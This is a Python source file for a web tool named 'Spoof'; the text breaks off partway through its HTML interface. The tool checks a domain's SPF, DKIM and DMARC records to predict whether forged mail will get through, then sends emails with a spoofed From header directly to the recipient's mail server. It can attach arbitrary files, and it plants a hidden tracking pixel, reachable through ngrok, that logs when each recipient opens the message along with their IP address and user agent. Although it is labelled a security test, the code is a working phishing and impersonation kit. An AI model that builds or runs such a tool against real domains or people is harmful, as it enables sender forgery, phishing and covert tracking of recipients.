#!/usr/bin/env python3
"""
spoof_server.py — Web UI for email spoof testing.

Features:
  - Preflight check: DNS lookups (MX, SPF, DKIM, DMARC) + SMTP probe
  - Full send: raw SMTP delivery with spoofed headers
  - Configurable From, To, Subject, Body (text + HTML), attachments

Usage:
    python3 spoof_server.py          # starts on http://localhost:8090
    python3 spoof_server.py 9000     # custom port

No dependencies beyond Python 3 standard library.
"""

import json
import smtplib
import socket
import subprocess
import sys
import os
import io
import base64
import traceback
import uuid
import threading
import re
from http.server import HTTPServer, BaseHTTPRequestHandler
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime, timezone
from urllib.parse import parse_qs

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8090

# ── Ngrok detection ─────────────────────────────────────────────────
_ngrok_url = None  # cached public URL

def get_ngrok_url():
    """Check if ngrok is tunneling our port. Returns public URL or None."""
    global _ngrok_url
    try:
        import urllib.request
        resp = urllib.request.urlopen("http://127.0.0.1:4040/api/tunnels", timeout=2)
        data = json.loads(resp.read())
        for t in data.get("tunnels", []):
            # Match tunnel forwarding to our port
            if f":{PORT}" in t.get("config", {}).get("addr", ""):
                _ngrok_url = t["public_url"]
                return _ngrok_url
            # Also check the forwarding URL pattern
            if t.get("proto") == "https" and str(PORT) in t.get("config", {}).get("addr", ""):
                _ngrok_url = t["public_url"]
                return _ngrok_url
    except:
        pass
    _ngrok_url = None
    return None

# ── Tracking pixel storage ──────────────────────────────────────────
# { track_id: { "from": ..., "to": ..., "subject": ..., "sent_at": ..., "opens": [ {"time": ..., "ip": ..., "ua": ...}, ... ] } }
_track_store = {}
_track_lock = threading.Lock()

# ── Event log for dashboard ────────────────────────────────────────
# List of { "type": "send"|"open", "time": ..., "track_id": ..., "from": ..., "to": ..., "subject": ..., "success": bool }
_event_log = []
_event_lock = threading.Lock()

# 1x1 transparent GIF (43 bytes)
TRACKING_GIF = base64.b64decode(
    "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"
)


# ── DNS helpers ─────────────────────────────────────────────────────
def dig(record_type, domain):
    """Run dig and return raw output."""
    try:
        r = subprocess.run(
            ["dig", "+short", record_type, domain],
            capture_output=True, text=True, timeout=5
        )
        if r.returncode == 0:
            return r.stdout.strip()
    except:
        pass
    return ""

def get_mx(domain):
    """Resolve MX records, return (best_host, all_records_list, log_lines)."""
    lines = []
    raw = dig("MX", domain)
    if raw:
        records = []
        for line in raw.split("\n"):
            parts = line.strip().split()
            if len(parts) == 2:
                pri, host = int(parts[0]), parts[1].rstrip(".")
                records.append((pri, host))
        records.sort()
        if records:
            return records[0][1], records, []
    return None, [], [f"  Could not resolve MX for {domain}"]


# ── Preflight check ────────────────────────────────────────────────
def run_preflight(from_addr, to_addr, envelope_from):
    """DNS lookups + SMTP probe (no message sent). Returns structured results."""
    from_domain = from_addr.split("@")[-1].strip(">").strip()
    env_domain = envelope_from.split("@")[-1].strip(">").strip()
    to_domain = to_addr.split("@")[1].strip()

    result = {
        "from_domain": from_domain,
        "to_domain": to_domain,
        "env_domain": env_domain,
        "mx": {"records": [], "selected": None, "error": None},
        "spf": {"record": None, "policy": None, "verdict": None},
        "dkim": {"found": False, "record": None, "note": None},
        "dmarc": {"record": None, "policy": None, "verdict": None},
        "probe": {"port25": None, "ehlo": None, "starttls": None,
                  "mail_from": None, "rcpt_to": None, "prediction": None},
        "log": [],
    }
    log = result["log"]

    # ── MX lookup ──
    log.append("═══ DNS: MX Records ═══")
    log.append(f"  dig MX {to_domain}")
    best, records, errs = get_mx(to_domain)
    log.extend(errs)
    for pri, host in records:
        log.append(f"  priority {pri}: {host}")
    if best:
        result["mx"]["selected"] = best
        result["mx"]["records"] = [{"priority": p, "host": h} for p, h in records]
        log.append(f"  ✓ Will connect to: {best}")
    else:
        result["mx"]["error"] = f"No MX records found for {to_domain}"
        log.append(f"  ✗ No MX records found for {to_domain}")
        result["probe"]["prediction"] = "CANNOT_RESOLVE"
        return result

    # ── SPF lookup ──
    log.append("")
    log.append("═══ DNS: SPF Record ═══")
    log.append(f"  dig TXT {from_domain} (looking for v=spf1)")
    raw_txt = dig("TXT", from_domain)
    spf_rec = None
    for line in raw_txt.split("\n"):
        cleaned = line.strip().strip('"')
        if cleaned.startswith("v=spf1"):
            spf_rec = cleaned
            break
    if spf_rec:
        result["spf"]["record"] = spf_rec
        log.append(f"  Found: {spf_rec}")
        if "-all" in spf_rec:
            result["spf"]["policy"] = "hardfail (-all)"
            result["spf"]["verdict"] = "FAIL"
            log.append(f"  Policy: -all (hardfail) → unauthorized IPs get FAIL")
        elif "~all" in spf_rec:
            result["spf"]["policy"] = "softfail (~all)"
            result["spf"]["verdict"] = "SOFTFAIL"
            log.append(f"  Policy: ~all (softfail) → unauthorized IPs get SOFTFAIL")
            log.append(f"  ⚠ Softfail is weak — many servers still deliver")
        elif "?all" in spf_rec:
            result["spf"]["policy"] = "neutral (?all)"
            result["spf"]["verdict"] = "NEUTRAL"
            log.append(f"  Policy: ?all (neutral) → no opinion on unauthorized IPs")
        elif "+all" in spf_rec:
            result["spf"]["policy"] = "pass (+all)"
            result["spf"]["verdict"] = "PASS"
            log.append(f"  Policy: +all → ANYONE can send (wide open!)")
        else:
            result["spf"]["policy"] = "unknown"
            result["spf"]["verdict"] = "UNKNOWN"
            log.append(f"  Policy: could not determine 'all' mechanism")
        log.append(f"  Your IP is NOT in this SPF record → verdict: {result['spf']['verdict']}")
    else:
        result["spf"]["record"] = None
        result["spf"]["verdict"] = "NONE"
        log.append(f"  ✗ No SPF record found for {from_domain}")
        log.append(f"  Without SPF, there's no IP authorization at all")

    # ── DKIM lookup ──
    log.append("")
    log.append("═══ DNS: DKIM ═══")
    selectors = ["google", "default", "selector1", "selector2", "k1", "s1", "20230601"]
    dkim_found = False
    for sel in selectors:
        dkim_domain = f"{sel}._domainkey.{from_domain}"
        dkim_raw = dig("TXT", dkim_domain)
        if dkim_raw and "p=" in dkim_raw:
            result["dkim"]["found"] = True
            result["dkim"]["record"] = f"{sel}._domainkey.{from_domain}"
            dkim_found = True
            log.append(f"  ✓ Found DKIM key at: {dkim_domain}")
            log.append(f"  But attacker does NOT have the private key → DKIM will FAIL")
            break
    if not dkim_found:
        log.append(f"  Checked selectors: {', '.join(selectors)}")
        log.append(f"  ✗ No DKIM public key found (or using unknown selector)")
        result["dkim"]["note"] = "No DKIM key found in common selectors"
    log.append(f"  Attacker cannot sign → DKIM verdict: FAIL or NONE")

    # ── DMARC lookup ──
    log.append("")
    log.append("═══ DNS: DMARC Record ═══")
    dmarc_domain = f"_dmarc.{from_domain}"
    log.append(f"  dig TXT {dmarc_domain}")
    dmarc_raw = dig("TXT", dmarc_domain)
    dmarc_rec = None
    for line in dmarc_raw.split("\n"):
        cleaned = line.strip().strip('"')
        if cleaned.startswith("v=DMARC1"):
            dmarc_rec = cleaned
            break
    if dmarc_rec:
        result["dmarc"]["record"] = dmarc_rec
        log.append(f"  Found: {dmarc_rec}")
        if "p=reject" in dmarc_rec:
            result["dmarc"]["policy"] = "reject"
            result["dmarc"]["verdict"] = "BLOCKED"
            log.append(f"  Policy: p=reject → spoofed emails WILL be rejected ✓")
        elif "p=quarantine" in dmarc_rec:
            result["dmarc"]["policy"] = "quarantine"
            result["dmarc"]["verdict"] = "QUARANTINE"
            log.append(f"  Policy: p=quarantine → spoofed emails go to spam")
        elif "p=none" in dmarc_rec:
            result["dmarc"]["policy"] = "none"
            result["dmarc"]["verdict"] = "ALLOW"
            log.append(f"  Policy: p=none → spoofed emails are DELIVERED (no action)")
            log.append(f"  ⚠ This is the vulnerability — DMARC sees the failure but does nothing")
        else:
            result["dmarc"]["policy"] = "unknown"
            result["dmarc"]["verdict"] = "UNKNOWN"
    else:
        result["dmarc"]["record"] = None
        result["dmarc"]["policy"] = "missing"
        result["dmarc"]["verdict"] = "NO_POLICY"
        log.append(f"  ✗ No DMARC record found for {from_domain}")
        log.append(f"  Without DMARC, receivers make their own decision")

    # ── SMTP probe ──
    log.append("")
    log.append("═══ SMTP Probe (no message sent) ═══")
    mx_host = result["mx"]["selected"]
    log.append(f"  Connecting to {mx_host}:25 ...")

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(8)
        conn_result = sock.connect_ex((mx_host, 25))
        sock.close()

        if conn_result != 0:
            result["probe"]["port25"] = "BLOCKED"
            log.append(f"  ✗ Port 25 blocked (cannot connect)")
            result["probe"]["prediction"] = "PORT_BLOCKED"
            return result

        result["probe"]["port25"] = "OPEN"
        log.append(f"  ✓ Port 25 open")

        with smtplib.SMTP(mx_host, 25, timeout=15) as server:
            server.ehlo("probe.local")
            result["probe"]["ehlo"] = "OK"
            log.append(f"  ✓ EHLO accepted")

            if server.has_extn("STARTTLS"):
                server.starttls()
                server.ehlo("probe.local")
                result["probe"]["starttls"] = "OK"
                log.append(f"  ✓ STARTTLS established")
            else:
                result["probe"]["starttls"] = "NOT_SUPPORTED"
                log.append(f"  ⚠ STARTTLS not supported")

            code, resp = server.mail(envelope_from)
            if code == 250:
                result["probe"]["mail_from"] = "ACCEPTED"
                log.append(f"  ✓ MAIL FROM:<{envelope_from}> accepted (250)")
            else:
                result["probe"]["mail_from"] = f"REJECTED_{code}"
                detail = resp.decode(errors="replace")[:100]
                log.append(f"  ✗ MAIL FROM rejected: {code} {detail}")
                result["probe"]["prediction"] = "MAIL_FROM_REJECTED"
                server.rset()
                return result

            code, resp = server.rcpt(to_addr)
            detail = resp.decode(errors="replace")[:100]
            if code == 250:
                result["probe"]["rcpt_to"] = "ACCEPTED"
                log.append(f"  ✓ RCPT TO:<{to_addr}> accepted (250)")
            else:
                result["probe"]["rcpt_to"] = f"REJECTED_{code}"
                log.append(f"  ✗ RCPT TO rejected: {code} {detail}")
                result["probe"]["prediction"] = "RCPT_REJECTED"
                server.rset()
                return result

            # Don't send DATA — just RSET and quit
            server.rset()
            log.append(f"  ✓ RSET — connection closed cleanly (no email sent)")

    except Exception as e:
        result["probe"]["port25"] = result["probe"].get("port25", "ERROR")
        log.append(f"  ✗ Error: {type(e).__name__}: {str(e)[:80]}")
        result["probe"]["prediction"] = "ERROR"
        return result

    # ── Prediction ──
    log.append("")
    log.append("═══ Prediction ═══")

    dmarc_p = result["dmarc"]["policy"]
    spf_v = result["spf"]["verdict"]

    if dmarc_p == "reject":
        result["probe"]["prediction"] = "BLOCKED"
        log.append("  DMARC p=reject → server will REJECT the spoofed email")
        log.append("  ✓ Domain is protected")
    elif dmarc_p == "quarantine":
        result["probe"]["prediction"] = "SPAM"
        log.append("  DMARC p=quarantine → email will land in SPAM folder")
        log.append("  ⚠ Partial protection — attacker's email still arrives")
    elif dmarc_p == "none":
        result["probe"]["prediction"] = "DELIVERED"
        log.append("  DMARC p=none + SPF ~all → email will be DELIVERED")
        log.append("  ✗ Domain is VULNERABLE to spoofing on this provider")
        log.append("")
        log.append("  NOTE: Gmail/Outlook/Yahoo have extra protections that may")
        log.append("  still block this. Other providers will follow DMARC literally.")
    elif dmarc_p == "missing":
        result["probe"]["prediction"] = "LIKELY_DELIVERED"
        log.append("  No DMARC record → server decides on its own")
        log.append("  Most servers will deliver or spam-filter based on SPF alone")
    else:
        result["probe"]["prediction"] = "UNKNOWN"
        log.append("  Cannot determine outcome — test by sending")

    return result


# ── Send Email (unchanged logic) ───────────────────────────────────
def send_spoofed_email(from_addr, to_addr, envelope_from, subject, body_text, body_html, attachments, server_host="localhost"):
    log = []
    rcpt_domain = to_addr.split("@")[1]

    # Generate tracking pixel ID
    track_id = uuid.uuid4().hex[:12]
    # Prefer ngrok public URL so recipient's email client can reach us
    ngrok = get_ngrok_url()
    if ngrok:
        tracking_url = f"{ngrok}/track/{track_id}.gif"
    else:
        tracking_url = f"http://{server_host}:{PORT}/track/{track_id}.gif"
    tracking_pixel = f'<img src="{tracking_url}" width="1" height="1" style="display:none" alt="" />'

    log.append("═══ Step 1: DNS MX Lookup ═══")
    log.append(f"  Resolving MX for: {rcpt_domain}")
    best, records, errs = get_mx(rcpt_domain)
    log.extend(errs)
    for pri, host in records:
        log.append(f"  MX priority {pri}: {host}")
    if not best:
        log.append(f"  ✗ No MX records found")
        return {"success": False, "log": "\n".join(log)}
    mx_host = best
    log.append(f"  ✓ Selected: {mx_host}")

    log.append("")
    log.append("═══ Step 2: Building Message ═══")
    log.append(f"  From header:   {from_addr}  (spoofed)")
    log.append(f"  Envelope from: {envelope_from}")
    log.append(f"  To:            {to_addr}")
    log.append(f"  Subject:       {subject}")

    # Inject tracking pixel into HTML body
    if body_html:
        # Append pixel before closing </div>, </body>, or at end
        if '</body>' in body_html.lower():
            body_html = body_html.replace('</body>', f'{tracking_pixel}</body>').replace('</BODY>', f'{tracking_pixel}</BODY>')
        elif '</div>' in body_html:
            # Insert before the last </div>
            idx = body_html.rfind('</div>')
            body_html = body_html[:idx] + tracking_pixel + body_html[idx:]
        else:
            body_html += tracking_pixel
        log.append(f"  🔍 Tracking pixel injected: {track_id}")
        log.append(f"  🔗 Pixel URL: {tracking_url}")
    else:
        # Wrap plain text in minimal HTML to get a pixel
        body_html = f'<html><body><pre>{body_text}</pre>{tracking_pixel}</body></html>'
        log.append(f"  🔍 Tracking pixel injected (auto-wrapped HTML): {track_id}")
        log.append(f"  🔗 Pixel URL: {tracking_url}")

    has_attachments = len(attachments) > 0
    msg = MIMEMultipart("mixed")
    body_alt = MIMEMultipart("alternative")
    body_alt.attach(MIMEText(body_text, "plain"))
    body_alt.attach(MIMEText(body_html, "html"))
    msg.attach(body_alt)
    for fname, fdata in attachments:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(fdata)
        encoders.encode_base64(part)
        part.add_header("Content-Disposition", f'attachment; filename="{fname}"')
        msg.attach(part)
        log.append(f"  Attachment:    {fname} ({len(fdata)} bytes)")

    msg["From"] = from_addr
    msg["To"] = to_addr
    msg["Subject"] = subject
    msg["Date"] = datetime.now(timezone.utc).strftime("%a, %d %b %Y %H:%M:%S +0000")
    msg["Message-ID"] = f"<spoof-{int(datetime.now().timestamp())}@{from_addr.split('@')[1]}>"

    log.append("")
    log.append("═══ Step 3: SMTP Connection ═══")
    log.append(f"  Connecting to {mx_host}:25 ...")

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        result = sock.connect_ex((mx_host, 25))
        sock.close()
        if result != 0:
            log.append(f"  ✗ Cannot connect to {mx_host}:25")
            return {"success": False, "log": "\n".join(log)}

        log.append(f"  ✓ Port 25 reachable")

        with smtplib.SMTP(mx_host, 25, timeout=30) as server:
            server.ehlo("security-test.local")
            log.append(f"  ✓ EHLO accepted by {mx_host}")
            if server.has_extn("STARTTLS"):
                server.starttls()
                server.ehlo("security-test.local")
                log.append("  ✓ STARTTLS encryption established")

            code, resp = server.mail(envelope_from)
            log.append(f"  MAIL FROM:<{envelope_from}> → {code}")
            if code != 250:
                log.append(f"  ✗ MAIL FROM rejected")
                return {"success": False, "log": "\n".join(log)}

            code, resp = server.rcpt(to_addr)
            log.append(f"  RCPT TO:<{to_addr}> → {code} {resp.decode(errors='replace')[:60]}")
            if code != 250:
                log.append(f"  ✗ Recipient rejected")
                return {"success": False, "log": "\n".join(log)}

            code, resp = server.data(msg.as_string().encode())
            detail = resp.decode(errors="replace")[:80]
            log.append(f"  DATA → {code} {detail}")

            if code == 250:
                log.append("")
                log.append("  ✅ EMAIL DELIVERED SUCCESSFULLY")
                log.append(f"  Check {to_addr}'s inbox or spam folder.")
                log.append(f"  🔍 Tracking pixel ID: {track_id}")
                # Store tracking info
                sent_time = datetime.now(timezone.utc).isoformat()
                with _track_lock:
                    _track_store[track_id] = {
                        "from": from_addr, "to": to_addr, "subject": subject,
                        "sent_at": sent_time,
                        "opens": []
                    }
                with _event_lock:
                    _event_log.append({
                        "type": "send", "time": sent_time, "track_id": track_id,
                        "from": from_addr, "to": to_addr, "subject": subject, "success": True
                    })
                return {"success": True, "log": "\n".join(log), "track_id": track_id}
            else:
                log.append(f"  ✗ Rejected at DATA stage: {code} {detail}")
                return {"success": False, "log": "\n".join(log)}

    except Exception as e:
        log.append(f"  ✗ Error: {type(e).__name__}: {e}")
        with _event_lock:
            _event_log.append({
                "type": "send", "time": datetime.now(timezone.utc).isoformat(),
                "track_id": track_id, "from": from_addr, "to": to_addr,
                "subject": subject, "success": False
            })
        return {"success": False, "log": "\n".join(log)}


# ── HTML UI ─────────────────────────────────────────────────────────
HTML_PAGE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Spoof</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
    background: #f8faf8; color: #1a1a1a; min-height: 100vh;
  }

  .topbar {
    display: flex; justify-content: space-between; align-items: center;
    padding: .6rem 1.5rem; border-bottom: 1px solid #e0e8e0;
    background: #fff;
  }
  .topbar-left { display: flex; align-items: center; gap: 1rem; }
  .brand { font-size: .85rem; font-weight: 700; color: #166534; }
  .tabs { display: flex; }
  .tab {
    padding: .4rem .8rem; font-size: .72rem; color: #888;
    cursor: pointer; border-bottom: 2px solid transparent;
    background: none; border-top: none; border-left: none; border-right: none;
    font-family: inherit;
  }
  .tab:hover { color: #555; }
  .tab.active { color: #166534; border-bottom-color: #22c55e; }
  .status-pill {
    font-size: .6rem; padding: .2rem .5rem; border-radius: 100px;
    background: #f0fdf4; color: #15803d; border: 1px solid #bbf7d0;
    cursor: default;
  }
  .status-pill.off { background: #fef9ee; color: #a16207; border-color: #fde68a; }

  .page { max-width: 720px; margin: 0 auto; padding: 1.5rem; display: none; }
  .page.active { display: block; }

  /* State bar */
  .state-bar {
    display: flex; align-items: center; gap: .5rem;
    padding: .6rem .8rem; border-radius: 8px; margin-bottom: 1.2rem;
    background: #f9fafb; border: 1px solid #e5e7eb;
    font-size: .72rem; color: #9ca3af;
  }
  .state-dot {
    width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; background: #d1d5db;
  }
  .state-bar.ready { background: #f0fdf4; border-color: #bbf7d0; color: #15803d; }
  .state-bar.ready .state-dot { background: #22c55e; }
  .state-bar.working { background: #eff6ff; border-color: #bfdbfe; color: #1d4ed8; }
  .state-bar.working .state-dot { background: #3b82f6; animation: pulse 1.5s infinite; }
  .state-bar.failed { background: #fef2f2; border-color: #fecaca; color: #dc2626; }
  .state-bar.failed .state-dot { background: #ef4444; }
  .state-bar.success { background: #f0fdf4; border-color: #bbf7d0; color: #15803d; }
  .state-bar.success .state-dot { background: #22c55e; }
  .state-steps {
    margin-left: auto; display: flex; gap: 2px; align-items: center;
  }
  .state-step { width: 24px; height: 3px; border-radius: 2px; background: #e0e8e0; }
  .state-step.done { background: #22c55e; }
  .state-step.active { background: #3b82f6; }
  .state-step.fail { background: #ef4444; }
  @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: .4; } }

  /* Form */
  .form-grid {
    display: grid; grid-template-columns: 1fr 1fr; gap: .6rem .8rem;
    margin-bottom: .8rem;
  }
  .form-grid .full { grid-column: 1 / -1; }
  .field label {
    display: block; font-size: .62rem; font-weight: 600; color: #6b7280;
    margin-bottom: .25rem; text-transform: uppercase; letter-spacing: .04em;
  }
  .field input, .field textarea {
    width: 100%; background: #fff; border: 1px solid #d1d9d1;
    border-radius: 6px; padding: .5rem .6rem; color: #1a1a1a;
    font-size: .78rem; font-family: inherit;
  }
  .field input:focus, .field textarea:focus { outline: none; border-color: #22c55e; box-shadow: 0 0 0 3px #22c55e15; }
  .field input::placeholder, .field textarea::placeholder { color: #b0b8b0; }
  .field textarea { resize: vertical; min-height: 48px; font-family: 'SF Mono', Menlo, monospace; font-size: .7rem; }

  .toggle-row {
    display: flex; align-items: center; gap: .35rem; font-size: .68rem; color: #6b7280;
    margin-bottom: .6rem;
  }
  .toggle-row input { accent-color: #22c55e; }

  /* Preview iframe */
  .preview-frame {
    width: 100%; height: 140px; border: 1px solid #e0e8e0; border-radius: 6px;
    background: #fff; margin-bottom: .8rem;
  }

  .actions { display: flex; gap: .5rem; margin-bottom: 1.2rem; }
  .btn {
    padding: .55rem 1.2rem; border-radius: 6px; font-size: .75rem; font-weight: 600;
    cursor: pointer; font-family: inherit; border: 1px solid;
  }
  .btn-secondary { background: #fff; border-color: #d1d9d1; color: #555; }
  .btn-secondary:hover { background: #f0fdf4; border-color: #86efac; color: #166534; }
  .btn-primary { background: #22c55e; border-color: #22c55e; color: #fff; }
  .btn-primary:hover { background: #16a34a; border-color: #16a34a; }
  .btn.sending { opacity: .6; pointer-events: none; }
  .btn.success { background: #16a34a; border-color: #16a34a; }

  /* Password inline */
  .pw-inline { display: none; align-items: center; gap: .4rem; margin-bottom: 1.2rem; }
  .pw-inline.show { display: flex; }
  .pw-inline input {
    background: #fff; border: 1px solid #d1d9d1; border-radius: 6px;
    padding: .45rem .6rem; font-size: .75rem; width: 160px; font-family: inherit;
  }
  .pw-inline input:focus { outline: none; border-color: #22c55e; }
  .pw-inline button {
    padding: .45rem .8rem; border: none; border-radius: 6px;
    background: #22c55e; color: #fff; font-size: .7rem; font-weight: 600;
    cursor: pointer; font-family: inherit;
  }
  .pw-inline button:hover { background: #16a34a; }
  .pw-err { color: #dc2626; font-size: .6rem; min-height: .8rem; }

  /* Collapsible sections */
  .section {
    border: 1px solid #e0e8e0; border-radius: 8px; overflow: hidden;
    margin-bottom: .8rem; background: #fff;
  }
  .section-header {
    display: flex; justify-content: space-between; align-items: center;
    padding: .5rem .7rem; background: #fafcfa; cursor: pointer;
    font-size: .68rem; font-weight: 600; color: #374151;
    user-select: none;
  }
  .section-header:hover { background: #f0fdf4; }
  .section-header .arrow { transition: transform .2s; font-size: .5rem; color: #9ca3af; margin-right: .4rem; }
  .section.open .section-header .arrow { transform: rotate(90deg); }
  .section-badges { display: flex; gap: .3rem; }
  .section-badge {
    font-size: .55rem; padding: .12rem .4rem; border-radius: 100px; font-weight: 700;
  }
  .badge-ok { background: #dcfce7; color: #15803d; }
  .badge-warn { background: #fef3c7; color: #a16207; }
  .badge-fail { background: #fee2e2; color: #dc2626; }
  .badge-info { background: #dbeafe; color: #1d4ed8; }
  .badge-none { background: #f3f4f6; color: #6b7280; }
  .section-body {
    display: none;
    padding: .7rem; font-family: 'SF Mono', Menlo, monospace; font-size: .65rem;
    line-height: 1.6; color: #6b7280; border-top: 1px solid #e0e8e0;
    max-height: 280px; overflow-y: auto;
  }
  .section.open .section-body { display: block; }
  .section-body .g { color: #16a34a; }
  .section-body .b { color: #2563eb; }
  .section-body .r { color: #dc2626; }
  .section-body .y { color: #ca8a04; }
  .section-body .d { color: #c0c8c0; }

  .dns-grid { display: grid; grid-template-columns: 1fr 1fr; gap: .5rem; font-family: inherit; }
  .dns-card {
    background: #fafcfa; border: 1px solid #e8f0e8; border-radius: 6px; padding: .5rem;
  }
  .dns-card h4 {
    font-size: .6rem; color: #6b7280; text-transform: uppercase; letter-spacing: .04em;
    margin-bottom: .3rem; display: flex; justify-content: space-between;
  }
  .dns-card p { font-size: .65rem; color: #555; line-height: 1.4; word-break: break-all; }
  .dns-card code { font-size: .6rem; background: #f0f4f0; padding: .08rem .2rem; border-radius: 3px; color: #1a1a1a; }

  /* Probe steps */
  .probe-steps { display: flex; gap: .3rem; margin-bottom: .6rem; flex-wrap: wrap; }
  .probe-step {
    display: flex; align-items: center; gap: .3rem;
    padding: .25rem .5rem; border-radius: 6px; font-size: .6rem;
    background: #f3f4f6; color: #6b7280; font-family: inherit;
  }
  .probe-step.ok { background: #dcfce7; color: #15803d; }
  .probe-step.fail { background: #fee2e2; color: #dc2626; }
  .probe-step.warn { background: #fef3c7; color: #a16207; }
  .probe-step .label { font-weight: 600; }
  .probe-step .status { font-family: 'SF Mono', Menlo, monospace; }

  .pf-badge { font-size: .5rem; padding: .1rem .3rem; border-radius: 100px; font-weight: 700; vertical-align: middle; }
  .pf-badge.pass { background: #dcfce7; color: #15803d; }
  .pf-badge.warn { background: #fef3c7; color: #a16207; }
  .pf-badge.fail { background: #fee2e2; color: #dc2626; }
  .pf-badge.info { background: #dbeafe; color: #1d4ed8; }
  .pf-badge.none { background: #f3f4f6; color: #6b7280; }

  .pf-grid { display: grid; grid-template-columns: 1fr 1fr; gap: .5rem; }
  .pf-card {
    background: #fafcfa; border: 1px solid #e8f0e8; border-radius: 6px; padding: .5rem;
  }
  .pf-card h3 { font-size: .62rem; margin-bottom: .2rem; }
  .pf-card p { font-size: .6rem; color: #555; line-height: 1.4; word-break: break-all; }
  .pf-card code { font-size: .58rem; background: #f0f4f0; padding: .08rem .2rem; border-radius: 3px; color: #1a1a1a; }

  .log-output {
    font-family: 'SF Mono', Menlo, monospace; font-size: .65rem;
    line-height: 1.6; white-space: pre-wrap; color: #6b7280;
  }
  .log-output .header { color: #1d4ed8; font-weight: 600; }
  .log-output .success { color: #16a34a; }
  .log-output .error { color: #dc2626; }
  .log-output .warn { color: #ca8a04; }

  .pf-placeholder { text-align: center; padding: 2rem 1rem; color: #9ca3af; font-size: .75rem; font-family: inherit; }

  /* Tracker events */
  .open-event {
    display: flex; align-items: center; gap: .5rem; padding: .35rem 0;
    border-bottom: 1px solid #f0f4f0; font-size: .7rem;
  }
  .open-event:last-child { border-bottom: none; }
  .open-event .dot { width: 6px; height: 6px; border-radius: 50%; background: #22c55e; animation: pulse 1.5s infinite; flex-shrink: 0; }
  .open-event.waiting .dot { background: #d1d5db; animation: none; }
  .open-event .time { color: #16a34a; font-family: 'SF Mono', Menlo, monospace; font-size: .65rem; min-width: 60px; }
  .open-event.waiting .time { color: #9ca3af; }
  .open-event .detail { color: #6b7280; }

  /* File attachments */
  .file-drop { border: 1px dashed #d1d9d1; border-radius: 6px; padding: .5rem; text-align: center; font-size: .65rem; color: #9ca3af; cursor: pointer; margin-bottom: .6rem; }
  .file-drop:hover { border-color: #86efac; background: #f0fdf4; }
  .file-item { display: flex; justify-content: space-between; align-items: center; padding: .25rem .4rem; font-size: .65rem; color: #555; background: #f9fafb; border-radius: 4px; margin-top: .3rem; }
  .file-item .remove { cursor: pointer; color: #dc2626; font-size: .6rem; }

  /* ── Dashboard styles ── */
  .dash-stats {
    display: flex; gap: 1rem; margin-bottom: 1.5rem;
  }
  .stat-card {
    flex: 1; background: #fff; border: 1px solid #e0e8e0; border-radius: 8px;
    padding: 1rem; text-align: center;
  }
  .stat-card .num {
    font-size: 1.8rem; font-weight: 700;
    font-family: 'SF Mono', Menlo, monospace;
  }
  .stat-card .label { font-size: .62rem; color: #6b7280; text-transform: uppercase; letter-spacing: .06em; margin-top: .2rem; }
  .stat-sends .num { color: #166534; }
  .stat-opens .num { color: #22c55e; }
  .stat-rate .num { color: #a16207; }

  .dash-feed h2 {
    font-size: .65rem; color: #9ca3af; text-transform: uppercase;
    letter-spacing: .06em; margin-bottom: .8rem;
    padding-bottom: .4rem; border-bottom: 1px solid #e0e8e0;
  }
  .feed-empty {
    text-align: center; padding: 3rem 1rem; color: #9ca3af; font-size: .8rem;
  }
  .dash-event {
    display: flex; align-items: flex-start; gap: .8rem;
    padding: .6rem .5rem; border-radius: 8px;
    margin-bottom: .3rem; animation: slideIn .3s ease-out;
  }
  .dash-event:hover { background: #f0fdf4; }
  @keyframes slideIn {
    from { opacity: 0; transform: translateY(-8px); }
    to { opacity: 1; transform: translateY(0); }
  }
  .ev-icon {
    width: 28px; height: 28px; border-radius: 6px;
    display: flex; align-items: center; justify-content: center;
    flex-shrink: 0; font-size: .75rem;
  }
  .ev-send .ev-icon { background: #dbeafe; }
  .ev-open .ev-icon { background: #dcfce7; }
  .ev-body { flex: 1; min-width: 0; }
  .ev-title { font-size: .75rem; font-weight: 500; margin-bottom: .1rem; color: #1a1a1a; }
  .ev-detail {
    font-size: .65rem; color: #9ca3af;
    font-family: 'SF Mono', Menlo, monospace;
    white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
  }
  .ev-time {
    font-size: .55rem; color: #b0b8b0; flex-shrink: 0;
    font-family: 'SF Mono', Menlo, monospace;
  }

  /* Ngrok footer */
  .ngrok-footer {
    text-align: center; padding: .5rem; font-size: .55rem; color: #b0b8b0;
  }
  .ngrok-footer a { color: #22c55e; }
</style>
</head>
<body>

<div class="topbar">
  <div class="topbar-left">
    <div class="brand">Spoof</div>
    <div class="tabs">
      <button class="tab active" onclick="switchView('send')">Send</button>
      <button class="tab" onclick="switchView('dashboard')">Dashboard</button>
    </div>
  </div>
  <div class="status-pill off" id="ngrok-pill">ngrok disconnected</div>
</div>

<!-- ── Send View ── -->
<div class="page active" id="view-send">
  <div class="state-bar" id="state-bar">
    <div class="state-dot"></div>
    <span id="state-text">Ready to send</span>
    <div class="state-steps">
      <div class="state-step" id="step-0"></div>
      <div class="state-step" id="step-1"></div>
      <div class="state-step" id="step-2"></div>
      <div class="state-step" id="step-3"></div>
      <div class="state-step" id="step-4"></div>
    </div>
  </div>

  <div class="form-grid">
    <div class="field">
      <label>From (spoofed)</label>
      <input id="from_addr" placeholder="sender@example.com">
    </div>
    <div class="field">
      <label>Envelope / Return-Path</label>
      <input id="envelope_from" placeholder="bounce@example.com">
    </div>
    <div class="field">
      <label>To</label>
      <input id="to_addr" placeholder="user@recipient.com">
    </div>
    <div class="field">
      <label>Subject</label>
      <input id="subject" placeholder="Subject line">
    </div>
    <div class="field full">
      <label>Body (text)</label>
      <input id="body_text" placeholder="Plain text fallback">
    </div>
  </div>

  <div class="toggle-row">
    <input type="checkbox" id="use_html" checked> Include HTML body
  </div>
